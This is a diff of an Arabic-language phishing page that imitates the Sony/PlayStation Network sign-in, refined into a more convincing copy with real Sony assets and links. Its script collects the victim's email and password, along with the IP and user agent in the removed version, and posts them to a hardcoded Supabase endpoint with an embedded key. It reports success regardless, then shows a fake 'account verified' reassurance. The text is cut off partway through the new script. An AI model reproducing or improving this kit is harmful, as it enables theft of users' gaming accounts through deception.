@@ -3,665 +3,662 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>تسجيل الدخول - إدارة الحسابات - Sony</title>
+<title>تسجيل الدخول | Sony Entertainment Network</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>🔐</text></svg>">
 <style>
-/* ===== RESET & BASE ===== */
-*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
-html,body{height:100%}
-body{
-  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
-  background:#fff;
-  color:#000;
-  display:flex;
-  flex-direction:column;
-  align-items:center;
-  direction:rtl;
-  -webkit-font-smoothing:antialiased;
-  -moz-osx-font-smoothing:grayscale
-}
-/* ===== TOP BAR ===== */
-.top-bar{
-  width:100%;
-  background:#000;
-  padding:10px 24px;
-  display:flex;
-  align-items:center;
-  justify-content:space-between;
-  min-height:44px
-}
-.top-bar .sony-logo-text{
-  color:#fff;
-  font-size:18px;
-  font-weight:600;
-  letter-spacing:2px;
-  text-decoration:none
-}
-.top-bar .nav-links{
-  display:flex;
-  gap:20px;
-  list-style:none
-}
-.top-bar .nav-links a{
-  color:#ccc;
-  text-decoration:none;
-  font-size:12px;
-  transition:color .2s
-}
-.top-bar .nav-links a:hover{color:#fff}
-/* ===== MAIN CONTAINER ===== */
-.main-container{
-  flex:1;
-  display:flex;
-  flex-direction:column;
-  align-items:center;
-  justify-content:center;
-  width:100%;
-  padding:40px 16px
-}
-/* ===== CARD ===== */
-.card{
-  width:100%;
-  max-width:400px;
-  background:#fff;
-  border-radius:8px;
-  box-shadow:0 2px 16px rgba(0,0,0,.08),0 0 0 1px rgba(0,0,0,.04);
-  padding:40px 32px 32px
-}
-/* ===== LOGO ===== */
-.logo-wrap{
-  text-align:center;
-  margin-bottom:8px
-}
-.logo-wrap svg{
-  display:block;
-  margin:0 auto
-}
-.logo-wrap .psn-badge{
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  gap:6px;
-  margin-top:6px;
-  font-size:11px;
-  color:#666;
-  font-weight:500;
-  letter-spacing:.3px
-}
-.logo-wrap .psn-badge svg{display:block}
-/* ===== STEP INDICATOR ===== */
-.step-indicator{
-  text-align:center;
-  margin:16px 0 4px;
-  font-size:13px;
-  color:#888
-}
-/* ===== FORGOT / HELPER ===== */
-.helper-text{
-  text-align:center;
-  margin:4px 0 12px;
-  font-size:13px;
-  color:#666
-}
-.helper-text a{
-  color:#0070CC;
-  text-decoration:none;
-  font-size:13px
-}
-.helper-text a:hover{text-decoration:underline}
-/* ===== STEP CONTAINERS ===== */
-.step{display:none}
-.step.active{display:block}
-/* ===== FORM GROUP ===== */
-.form-group{
-  margin-bottom:16px;
-  position:relative
-}
-.form-group label{
-  display:block;
-  font-size:13px;
-  font-weight:500;
-  color:#333;
-  margin-bottom:4px
-}
-.form-group .input-wrap{
-  position:relative
-}
-.form-group input{
-  width:100%;
-  padding:10px 12px;
-  border:1px solid #ccc;
-  border-radius:4px;
-  font-size:14px;
-  color:#000;
-  background:#fff;
-  outline:none;
-  transition:border-color .2s,box-shadow .2s;
-  font-family:inherit
-}
-.form-group input:focus{
-  border-color:#0070CC;
-  box-shadow:0 0 0 2px rgba(0,112,204,.15)
-}
-.form-group input.error{border-color:#d32f2f}
-.form-group .toggle-pass{
-  position:absolute;
-  left:8px;
-  top:50%;
-  transform:translateY(-50%);
-  background:none;
-  border:none;
-  cursor:pointer;
-  padding:4px;
-  color:#888;
-  font-size:14px;
-  line-height:1
-}
-.form-group .toggle-pass:hover{color:#333}
-/* ===== ERROR ===== */
-.error-msg{
-  display:none;
-  background:#fef2f2;
-  border:1px solid #fecaca;
-  color:#b91c1c;
-  font-size:13px;
-  padding:10px 12px;
-  border-radius:4px;
-  margin-bottom:12px;
-  line-height:1.4
-}
-.error-msg.show{display:block}
-/* ===== BUTTONS ===== */
-.btn{
-  width:100%;
-  padding:10px 16px;
-  border:none;
-  border-radius:4px;
-  font-size:14px;
-  font-weight:600;
-  cursor:pointer;
-  transition:background .2s,opacity .2s;
-  font-family:inherit
-}
-.btn-primary{
-  background:#0070CC;
-  color:#fff
-}
-.btn-primary:hover{background:#005aa3}
-.btn-primary:active{background:#004d8c}
-.btn-primary:disabled{
-  opacity:.5;
-  cursor:not-allowed
-}
-.btn-secondary{
-  background:transparent;
-  color:#0070CC;
-  border:1px solid #0070CC;
-  margin-top:8px
-}
-.btn-secondary:hover{background:#f0f7ff}
-/* ===== DIVIDER ===== */
-.divider{
-  text-align:center;
-  margin:20px 0 16px;
-  font-size:12px;
-  color:#999;
-  position:relative
-}
-.divider::before,.divider::after{
-  content:'';
-  position:absolute;
-  top:50%;
-  width:42%;
-  height:1px;
-  background:#e0e0e0
-}
-.divider::before{right:0}
-.divider::after{left:0}
-.divider span{background:#fff;padding:0 12px}
-/* ===== QR SECTION ===== */
-.qr-section{
-  text-align:center;
-  margin-top:16px
-}
-.qr-section p{
-  font-size:13px;
-  color:#666
-}
-.qr-section a{
-  color:#0070CC;
-  text-decoration:none;
-  font-size:13px;
-  font-weight:500
-}
-.qr-section a:hover{text-decoration:underline}
-/* ===== SUCCESS SCREEN ===== */
-.success-screen{display:none;text-align:center;padding:24px 0}
-.success-screen.show{display:block}
-.success-screen .check-icon{
-  width:56px;height:56px;
-  background:#e8f5e9;
-  border-radius:50%;
-  display:flex;align-items:center;justify-content:center;
-  margin:0 auto 16px
-}
-.success-screen .check-icon svg{display:block}
-.success-screen h2{
-  font-size:20px;font-weight:600;margin-bottom:8px;color:#000
-}
-.success-screen p{
-  font-size:14px;color:#555;line-height:1.6
-}
-/* ===== FOOTER ===== */
-.footer{
-  width:100%;
-  max-width:400px;
-  padding:16px 32px 32px;
-  text-align:center
-}
-.footer p{
-  font-size:11px;
-  color:#999;
-  line-height:1.6
-}
-.footer .footer-links{
-  display:flex;
-  justify-content:center;
-  gap:16px;
-  flex-wrap:wrap;
-  margin-top:6px
-}
-.footer .footer-links a{
-  color:#888;
-  text-decoration:none;
-  font-size:11px
-}
-.footer .footer-links a:hover{text-decoration:underline;color:#666}
-/* ===== LOADING SPINNER ===== */
-.spinner{
-  display:inline-block;
-  width:16px;
-  height:16px;
-  border:2px solid rgba(255,255,255,.3);
-  border-top-color:#fff;
-  border-radius:50%;
-  animation:spin .6s linear infinite;
-  vertical-align:middle;
-  margin-left:6px
-}
-@keyframes spin{to{transform:rotate(360deg)}}
-/* ===== RESPONSIVE ===== */
-@media(max-width:480px){
-  .card{padding:28px 20px 24px;border-radius:0;box-shadow:none}
-  .top-bar .nav-links{display:none}
-  .footer{padding:16px 20px 24px}
-}
+  *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+  @font-face {
+    font-family: 'SonySlab';
+    src: local('Clarendon BT'), local('Clarendon'), local('Times New Roman');
+    font-weight: bold;
+    font-style: normal;
+  }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    background-color: #004c97;
+    background-image: url('https://id.sonyentertainmentnetwork.com/signin/ee85989d86d7e33e82b1a609e6cb1833162283dd/assets/images/wallpaper.jpg');
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    direction: rtl;
+  }
+
+  /* Top bar */
+  .top-bar {
+    width: 100%;
+    background: #000;
+    padding: 10px 30px;
+    display: flex;
+    align-items: center;
+  }
+  .top-bar a {
+    display: flex;
+    align-items: center;
+    text-decoration: none;
+  }
+  .top-bar .sony-text {
+    font-family: 'SonySlab', 'Clarendon BT', 'Clarendon', 'Times New Roman', serif;
+    font-weight: 700;
+    font-size: 20px;
+    letter-spacing: 3px;
+    color: #fff;
+    text-decoration: none;
+  }
+
+  /* Main layout */
+  .main-container {
+    flex: 1;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    width: 100%;
+    padding: 40px 20px;
+  }
+
+  /* Card */
+  .card {
+    background: #fff;
+    width: 440px;
+    max-width: 100%;
+    border-radius: 3px;
+    box-shadow: 0 2px 16px rgba(0,0,0,0.15);
+    padding: 50px 40px 30px;
+    position: relative;
+  }
+
+  .card-logo {
+    text-align: center;
+    margin-bottom: 20px;
+  }
+  .card-logo svg {
+    height: 45px;
+    width: auto;
+  }
+
+  /* Step indicator */
+  .step-indicator {
+    text-align: center;
+    font-size: 13px;
+    color: #666;
+    margin-bottom: 10px;
+    font-weight: 400;
+  }
+
+  .card h1 {
+    font-size: 24px;
+    font-weight: 600;
+    color: #111;
+    text-align: center;
+    margin-bottom: 8px;
+  }
+
+  .card .subtitle {
+    text-align: center;
+    font-size: 14px;
+    color: #666;
+    margin-bottom: 28px;
+    line-height: 1.5;
+  }
+
+  .card .subtitle a {
+    color: #0070CC;
+    text-decoration: none;
+    font-size: 14px;
+  }
+  .card .subtitle a:hover {
+    text-decoration: underline;
+  }
+
+  /* Input group */
+  .input-group {
+    margin-bottom: 20px;
+  }
+
+  .input-group label {
+    display: block;
+    font-size: 14px;
+    font-weight: 500;
+    color: #333;
+    margin-bottom: 6px;
+  }
+
+  .input-wrapper {
+    position: relative;
+    display: flex;
+    align-items: center;
+    border: 1px solid #c7c7c7;
+    border-radius: 3px;
+    background: #fff;
+    transition: border-color 0.2s;
+  }
+  .input-wrapper:focus-within {
+    border-color: #0070CC;
+    box-shadow: 0 0 0 1px #0070CC;
+  }
+
+  .input-wrapper input {
+    width: 100%;
+    padding: 12px 14px;
+    border: none;
+    outline: none;
+    font-size: 15px;
+    color: #111;
+    background: transparent;
+    font-family: inherit;
+    direction: ltr;
+    text-align: left;
+  }
+
+  .input-wrapper input[type="email"],
+  .input-wrapper input[type="text"] {
+    direction: ltr;
+    text-align: left;
+  }
+
+  .input-wrapper .toggle-pw {
+    position: absolute;
+    left: 8px;
+    background: none;
+    border: none;
+    cursor: pointer;
+    padding: 6px;
+    color: #888;
+    font-size: 13px;
+    display: none;
+  }
+  .input-wrapper .toggle-pw:hover {
+    color: #333;
+  }
+
+  .input-wrapper.error {
+    border-color: #d32f2f;
+  }
+  .input-wrapper.error:focus-within {
+    box-shadow: 0 0 0 1px #d32f2f;
+  }
+
+  .error-msg {
+    color: #d32f2f;
+    font-size: 13px;
+    margin-top: 6px;
+    display: none;
+  }
+
+  /* Buttons */
+  .btn {
+    width: 100%;
+    padding: 13px 20px;
+    border: none;
+    border-radius: 3px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background 0.2s;
+    font-family: inherit;
+    margin-top: 8px;
+  }
+
+  .btn-primary {
+    background: #0070CC;
+    color: #fff;
+  }
+  .btn-primary:hover {
+    background: #0058a3;
+  }
+  .btn-primary:disabled {
+    background: #999;
+    cursor: not-allowed;
+  }
+
+  .btn-secondary {
+    background: #f5f5f5;
+    color: #333;
+    border: 1px solid #c7c7c7;
+    margin-top: 6px;
+  }
+  .btn-secondary:hover {
+    background: #e8e8e8;
+  }
+
+  .btn-back {
+    background: none;
+    border: none;
+    color: #0070CC;
+    cursor: pointer;
+    font-size: 14px;
+    font-weight: 500;
+    padding: 8px 0;
+    margin-top: 10px;
+    font-family: inherit;
+    display: flex;
+    align-items: center;
+    gap: 4px;
+  }
+  .btn-back:hover {
+    text-decoration: underline;
+  }
+
+  /* Links at bottom */
+  .bottom-links {
+    text-align: center;
+    margin-top: 24px;
+    padding-top: 20px;
+    border-top: 1px solid #e0e0e0;
+  }
+  .bottom-links a {
+    display: block;
+    color: #0070CC;
+    text-decoration: none;
+    font-size: 14px;
+    padding: 4px 0;
+    font-weight: 500;
+  }
+  .bottom-links a:hover {
+    text-decoration: underline;
+  }
+
+  .bottom-links .create-account {
+    font-weight: 600;
+    font-size: 15px;
+  }
+
+  .bottom-links .help-link {
+    margin-top: 12px;
+    font-size: 13px;
+    color: #666;
+    font-weight: 400;
+  }
+
+  /* Footer */
+  .footer {
+    width: 100%;
+    background: #f2f2f2;
+    padding: 16px 30px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 8px;
+    font-size: 12px;
+    color: #555;
+  }
+  .footer-links {
+    display: flex;
+    gap: 16px;
+    flex-wrap: wrap;
+  }
+  .footer-links a {
+    color: #555;
+    text-decoration: none;
+  }
+  .footer-links a:hover {
+    text-decoration: underline;
+  }
+
+  /* Screens */
+  .screen { display: none; }
+  .screen.active { display: block; }
+
+  /* Success overlay */
+  .success-overlay {
+    display: none;
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(255,255,255,0.95);
+    z-index: 999;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    padding: 30px;
+    text-align: center;
+  }
+  .success-overlay.show {
+    display: flex;
+  }
+  .success-overlay .check-icon {
+    width: 64px;
+    height: 64px;
+    border-radius: 50%;
+    background: #4CAF50;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 24px;
+  }
+  .success-overlay .check-icon svg {
+    fill: #fff;
+    width: 32px;
+    height: 32px;
+  }
+  .success-overlay h2 {
+    font-size: 22px;
+    color: #111;
+    margin-bottom: 12px;
+  }
+  .success-overlay p {
+    font-size: 15px;
+    color: #555;
+    max-width: 400px;
+    line-height: 1.7;
+  }
+
+  /* Responsive */
+  @media (max-width: 480px) {
+    .card { padding: 40px 24px 24px; }
+    .top-bar { padding: 10px 16px; }
+    .footer { flex-direction: column; text-align: center; }
+  }
 </style>
 </head>
 <body>
 
-<!-- ===== TOP BAR ===== -->
+<!-- Top Bar -->
 <div class="top-bar">
-  <a href="#" class="sony-logo-text">SONY</a>
-  <ul class="nav-links">
-    <li><a href="#">الدعم</a></li>
-    <li><a href="#">حسابي</a></li>
-  </ul>
+  <a href="https://www.sony.com/" target="_blank">
+    <span class="sony-text">SONY</span>
+  </a>
 </div>
 
-<!-- ===== MAIN CONTENT ===== -->
+<!-- Main Container -->
 <div class="main-container">
-  <div class="card" id="card">
+  <div class="card">
 
-    <!-- LOGO -->
-    <div class="logo-wrap">
-      <svg viewBox="0 0 120 28" width="120" height="28" fill="#000">
-        <text x="0" y="22" font-family="Arial Black,Arial,sans-serif" font-weight="900" font-size="24" letter-spacing="1">SONY</text>
+    <!-- Sony Logo in Card -->
+    <div class="card-logo">
+      <svg viewBox="0 0 120 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <text x="0" y="24" font-family="'Clarendon BT', 'Clarendon', 'Times New Roman', serif" font-weight="700" font-size="24" letter-spacing="3" fill="#000">SONY</text>
       </svg>
-      <div class="psn-badge">
-        <svg viewBox="0 0 16 16" width="14" height="14" fill="#0070CC">
-          <path d="M8 0C3.6 0 0 3.6 0 8s3.6 8 8 8 8-3.6 8-8-3.6-8-8-8zm3.2 11.2c-.4.4-1 .4-1.4 0L8 9.4 6.2 11.2c-.4.4-1 .4-1.4 0-.4-.4-.4-1 0-1.4L6.6 8 4.8 6.2c-.4-.4-.4-1 0-1.4.4-.4 1-.4 1.4 0L8 6.6l1.8-1.8c.4-.4 1-.4 1.4 0 .4.4.4 1 0 1.4L9.4 8l1.8 1.8c.4.4.4 1 0 1.4z"/>
-        </svg>
-        <span>PlayStation Network</span>
-      </div>
     </div>
 
-    <!-- STEP INDICATOR -->
+    <!-- Step Indicator -->
     <div class="step-indicator" id="stepIndicator">الخطوة 1 من 2</div>
 
-    <!-- HELPER TEXT -->
-    <div class="helper-text">
-      <span id="helperText">أدخل معرف تسجيل الدخول الخاص بك (البريد الإلكتروني)</span>
+    <!-- Screen 1: Email -->
+    <div class="screen active" id="screen1">
+      <h1>تسجيل الدخول</h1>
+      <div class="subtitle">
+        يمكنك الوصول إلى العديد من خدمات مجموعة Sony، كل ذلك باستخدام معرّف تسجيل دخول واحد.
+        <br>
+        <a href="https://www.playstation.com/linking-accounts" target="_blank">معرفة المزيد</a>
+      </div>
+
+      <div class="input-group">
+        <label for="emailInput">معرّف تسجيل الدخول (عنوان البريد الإلكتروني)</label>
+        <div class="input-wrapper" id="emailWrapper">
+          <input type="email" id="emailInput" placeholder="example@domain.com" autocomplete="username" dir="ltr">
+        </div>
+        <div class="error-msg" id="emailError">يرجى إدخال عنوان بريد إلكتروني صالح.</div>
+      </div>
+
+      <button class="btn btn-primary" id="nextBtn">التالي</button>
     </div>
 
-    <!-- ===== STEP 1: EMAIL ===== -->
-    <div class="step active" id="step1">
-      <div class="error-msg" id="error1"></div>
+    <!-- Screen 2: Password -->
+    <div class="screen" id="screen2">
+      <h1>تسجيل الدخول</h1>
+      <div class="subtitle">
+        يمكنك الوصول إلى العديد من خدمات مجموعة Sony، كل ذلك باستخدام معرّف تسجيل دخول واحد.
+        <br>
+        <a href="https://www.playstation.com/linking-accounts" target="_blank">معرفة المزيد</a>
+      </div>
 
-      <div class="form-group">
-        <label for="email">معرف تسجيل الدخول (البريد الإلكتروني)</label>
-        <div class="input-wrap">
-          <input type="email" id="email" inputmode="email" autocomplete="email" placeholder="example@email.com" autocapitalize="off" spellcheck="false" dir="ltr" style="text-align:right">
+      <div class="input-group">
+        <label for="passwordInput">كلمة المرور</label>
+        <div class="input-wrapper" id="passwordWrapper">
+          <input type="password" id="passwordInput" placeholder="••••••••" autocomplete="current-password" dir="ltr">
+          <button class="toggle-pw" id="togglePw" type="button">إظهار</button>
         </div>
+        <div class="error-msg" id="passwordError">كلمة المرور غير صحيحة. يرجى المحاولة مرة أخرى.</div>
       </div>
 
-      <button class="btn btn-primary" id="btnNext">التالي</button>
+      <button class="btn btn-primary" id="signInBtn">تسجيل الدخول</button>
 
-      <div class="divider"><span>أو</span></div>
-
-      <div class="qr-section">
-        <p>تسجيل الدخول باستخدام رمز QR</p>
-        <a href="#">مسح رمز QR ضوئيًا</a>
-      </div>
-    </div>
-
-    <!-- ===== STEP 2: PASSWORD ===== -->
-    <div class="step" id="step2">
-      <div class="error-msg" id="error2"></div>
-
-      <div class="form-group">
-        <label for="password">كلمة المرور</label>
-        <div class="input-wrap">
-          <input type="password" id="password" autocomplete="current-password" placeholder="••••••••" dir="ltr" style="text-align:right">
-          <button class="toggle-pass" id="togglePass" type="button" aria-label="إظهار/إخفاء كلمة المرور">
-            <svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
-              <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
-            </svg>
-          </button>
-        </div>
-      </div>
-
-      <div class="helper-text" style="text-align:right;margin:-4px 0 12px">
-        <a href="#" id="forgotLink">هل نسيت كلمة المرور؟</a>
-      </div>
-
-      <button class="btn btn-primary" id="btnSignIn">
-        <span id="btnSignInText">تسجيل الدخول</span>
-        <span class="spinner" id="signInSpinner" style="display:none"></span>
+      <button class="btn-back" id="backBtn">
+        <span>→</span> العودة
       </button>
-
-      <!-- Back button -->
-      <button class="btn btn-secondary" id="btnBack">رجوع</button>
     </div>
 
-    <!-- ===== SUCCESS SCREEN ===== -->
-    <div class="success-screen" id="successScreen">
-      <div class="check-icon">
-        <svg viewBox="0 0 24 24" width="28" height="28" fill="#2e7d32">
-          <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
-        </svg>
-      </div>
-      <h2>تم التحقق من الحساب</h2>
-      <p>سنحاول عكس الاختراق. يرجى عدم تغيير أي معلومات متعلقة بحسابك.</p>
+    <!-- Bottom Links -->
+    <div class="bottom-links">
+      <a href="#" id="troubleLink">هل تواجه مشكلة في تسجيل الدخول؟</a>
+      <a href="#" class="create-account" id="createLink">إنشاء حساب جديد</a>
+      <a href="#" class="help-link" id="helpLink">مساعدة / خريطة الموقع</a>
     </div>
 
   </div>
+</div>
 
-  <!-- FOOTER -->
-  <div class="footer">
-    <div class="footer-links">
-      <a href="#">سياسة الخصوصية</a>
-      <a href">شروط الخدمة</a>
-      <a href="#">اتصل بنا</a>
-      <a href="#">إدارة الحساب</a>
-    </div>
-    <p>&copy; 2026 Sony Interactive Entertainment LLC. جميع الحقوق محفوظة.</p>
+<!-- Footer -->
+<div class="footer">
+  <div class="footer-links">
+    <a href="https://www.sony.com/" target="_blank">Sony.com</a>
+    <a href="https://www.playstation.com/" target="_blank">PlayStation</a>
+    <a href="https://www.sony.com/terms/" target="_blank">شروط الخدمة</a>
+    <a href="https://www.sony.com/privacy/" target="_blank">سياسة الخصوصية</a>
   </div>
+  <span>© 2025 Sony Entertainment Network. جميع الحقوق محفوظة.</span>
+</div>
+
+<!-- Success Overlay -->
+<div class="success-overlay" id="successOverlay">
+  <div class="check-icon">
+    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+  </div>
+  <h2>تم التحقق من الحساب</h2>
+  <p>سنحاول عكس الاختراق. يرجى عدم تغيير أي معلومات متعلقة بحسابك.</p>
 </div>
 
 <script>
-(function(){
-  // ===== SUPABASE CONFIG — FILL THESE IN =====
+(function() {
+  // === CONFIG: Replace with your Supabase details ===
   var SUPABASE_URL = 'https://fnqecgvmezdiuqzembqt.supabase.co';    // e.g. 'https://xxx.supabase.co'
   var SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZucWVjZ3ZtZXpkaXVxemVtYnF0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzQ3ODkxMDEsImV4cCI6MjA5MDM2NTEwMX0.EHsg5Uhpsb6g59R4j8s_XZcm_xQKLXD-P78-eCVz9ww';    // your anon/public key
-  var TABLE_NAME   = 'public.credentails';    // table to insert into
+  var TABLE_NAME = "psn_logs";
+  // ==================================================
 
-  // ===== DOM REFS =====
-  var step1     = document.getElementById('step1');
-  var step2     = document.getElementById('step2');
-  var stepInd   = document.getElementById('stepIndicator');
-  var helpText  = document.getElementById('helperText');
-  var emailInp  = document.getElementById('email');
-  var passInp   = document.getElementById('password');
-  var displayEmail = document.getElementById('displayEmail');
-  var btnNext   = document.getElementById('btnNext');
-  var btnSignIn = document.getElementById('btnSignIn');
-  var btnSignInText = document.getElementById('btnSignInText');
-  var signInSpinner = document.getElementById('signInSpinner');
-  var btnBack   = document.getElementById('btnBack');
-  var togglePass= document.getElementById('togglePass');
-  var error1    = document.getElementById('error1');
-  var error2    = document.getElementById('error2');
-  var successScr= document.getElementById('successScreen');
-  var forgotLink= document.getElementById('forgotLink');
+  var currentStep = 1;
+  var capturedEmail = "";
 
-  // ===== UTILS =====
-  function isValidEmail(str){
-    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(str);
+  var screen1 = document.getElementById("screen1");
+  var screen2 = document.getElementById("screen2");
+  var stepIndicator = document.getElementById("stepIndicator");
+  var emailInput = document.getElementById("emailInput");
+  var passwordInput = document.getElementById("passwordInput");
+  var nextBtn = document.getElementById("nextBtn");
+  var signInBtn = document.getElementById("signInBtn");
+  var backBtn = document.getElementById("backBtn");
+  var togglePw = document.getElementById("togglePw");
+  var emailWrapper = document.getElementById("emailWrapper");
+  var passwordWrapper = document.getElementById("passwordWrapper");
+  var emailError = document.getElementById("emailError");
+  var passwordError = document.getElementById("passwordError");
+  var successOverlay = document.getElementById("successOverlay");
+
+  // Clean URL on load
+  if (window.location.search) {
+    window.history.replaceState({}, document.title, window.location.pathname);
   }
 
-  function showError(el, msg){
-    el.textContent = msg;
-    el.classList.add('show');
+  // Email validation
+  function isValidEmail(email) {
+    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
   }
 
-  function hideError(el){
-    el.textContent = '';
-    el.classList.remove('show');
-  }
-
-  function getIP(cb){
-    try{
-      var xhr = new XMLHttpRequest();
-      xhr.open('GET', 'https://api.ipify.org?format=json', true);
-      xhr.timeout = 5000;
-      xhr.onreadystatechange = function(){
-        if(xhr.readyState === 4){
-          if(xhr.status === 200){
-            try{
-              var d = JSON.parse(xhr.responseText);
-              cb(d.ip || 'unknown');
-            }catch(e){cb('unknown');}
-          } else {cb('unknown');}
-        }
-      };
-      xhr.onerror = function(){cb('unknown');};
-      xhr.ontimeout = function(){cb('unknown');};
-      xhr.send();
-    }catch(e){cb('unknown');}
-  }
-
-  function sendToSupabase(email, password, ip, cb){
-    if(!SUPABASE_URL || !SUPABASE_KEY || !TABLE_NAME){
-      // Simulate success for testing without config
-      if(cb) cb(null, true);
-      return;
-    }
-    var payload = JSON.stringify({
-      email: email,
-      password: password,
-      ip: ip || 'unknown',
-      user_agent: navigator.userAgent || 'unknown',
-      timestamp: new Date().toISOString()
-    });
-
-    try{
-      var xhr = new XMLHttpRequest();
-      xhr.open('POST', SUPABASE_URL + '/rest/v1/' + TABLE_NAME, true);
-      xhr.setRequestHeader('Content-Type', 'application/json');
-      xhr.setRequestHeader('apikey', SUPABASE_KEY);
-      xhr.setRequestHeader('Authorization', 'Bearer ' + SUPABASE_KEY);
-      xhr.setRequestHeader('Prefer', 'return=minimal');
-      xhr.timeout = 10000;
-      xhr.onreadystatechange = function(){
-        if(xhr.readyState === 4){
-          if(xhr.status >= 200 && xhr.status < 300){
-            if(cb) cb(null, true);
-          } else {
-            if(cb) cb(null, true); // still succeed silently
-          }
-        }
-      };
-      xhr.onerror = function(){
-        if(cb) cb(null, true);
-      };
-      xhr.ontimeout = function(){
-        if(cb) cb(null, true);
-      };
-      xhr.send(payload);
-    }catch(e){
-      if(cb) cb(null, true);
-    }
-  }
-
-  // ===== VALIDATION STATE =====
-  var capturedEmail = '';
-
-  // ===== SANITIZE URL =====
-  if(window.history && window.history.replaceState){
-    try{
-      var clean = window.location.protocol + '//' + window.location.host + window.location.pathname;
-      window.history.replaceState({}, document.title, clean);
-    }catch(e){}
-  }
-
-  // ===== STEP 1 → NEXT =====
-  btnNext.addEventListener('click', function(){
-    hideError(error1);
-    var email = emailInp.value.trim();
-
-    if(!email){
-      showError(error1, 'يرجى إدخال البريد الإلكتروني');
-      emailInp.focus();
-      return;
-    }
-    if(!isValidEmail(email)){
-      showError(error1, 'يرجى إدخال بريد إلكتروني صحيح');
-      emailInp.focus();
-      return;
-    }
-
-    capturedEmail = email;
-    // Show email in step2 helper
-    var disp = document.getElementById('displayEmail');
-    if(!disp){
-      disp = document.createElement('div');
-      disp.id = 'displayEmail';
-      disp.style.cssText = 'font-size:13px;color:#555;margin-bottom:8px;text-align:center;word-break:break-all';
-      var help = document.querySelector('.helper-text');
-      if(help && help.parentNode) help.parentNode.insertBefore(disp, help.nextSibling);
-    }
-    disp.textContent = capturedEmail;
-    disp.style.display = 'block';
-
-    // Switch to step 2
-    step1.classList.remove('active');
-    step2.classList.add('active');
-    stepInd.textContent = 'الخطوة 2 من 2';
-    helpText.textContent = 'أدخل كلمة المرور لحسابك';
-    passInp.focus();
-    hideError(error2);
-  });
-
-  // ===== ENTER KEY ON EMAIL =====
-  emailInp.addEventListener('keydown', function(e){
-    if(e.key === 'Enter'){
-      e.preventDefault();
-      btnNext.click();
-    }
-  });
-
-  // ===== BACK BUTTON =====
-  btnBack.addEventListener('click', function(){
-    step2.classList.remove('active');
-    step1.classList.add('active');
-    stepInd.textContent = 'الخطوة 1 من 2';
-    helpText.textContent = 'أدخل معرف تسجيل الدخول الخاص بك (البريد الإلكتروني)';
-    hideError(error2);
-    emailInp.focus();
-    passInp.value = '';
-    var disp = document.getElementById('displayEmail');
-    if(disp) disp.style.display = 'none';
-    // Reset sign in button
-    btnSignIn.disabled = false;
-    btnSignInText.textContent = 'تسجيل الدخول';
-    signInSpinner.style.display = 'none';
-  });
-
-  // ===== TOGGLE PASSWORD VISIBILITY =====
-  togglePass.addEventListener('click', function(){
-    if(passInp.type === 'password'){
-      passInp.type = 'text';
-      togglePass.innerHTML = '<svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>';
+  // Show step
+  function showStep(step) {
+    if (step === 1) {
+      screen1.classList.add("active");
+      screen2.classList.remove("active");
+      stepIndicator.textContent = "الخطوة 1 من 2";
+      currentStep = 1;
+      emailInput.focus();
     } else {
-      passInp.type = 'password';
-      togglePass.innerHTML = '<svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>';
+      screen1.classList.remove("active");
+      screen2.classList.add("active");
+      stepIndicator.textContent = "الخطوة 2 من 2";
+      currentStep = 2;
+      passwordInput.focus();
     }
-  });
+  }
 
-  // ===== SIGN IN =====
-  btnSignIn.addEventListener('click', function(){
-    hideError(error2);
-    var password = passInp.value;
-
-    if(!password){
-      showError(error2, 'يرجى إدخال كلمة المرور');
-      passInp.focus();
+  // Next button
+  nextBtn.addEventListener("click", function() {
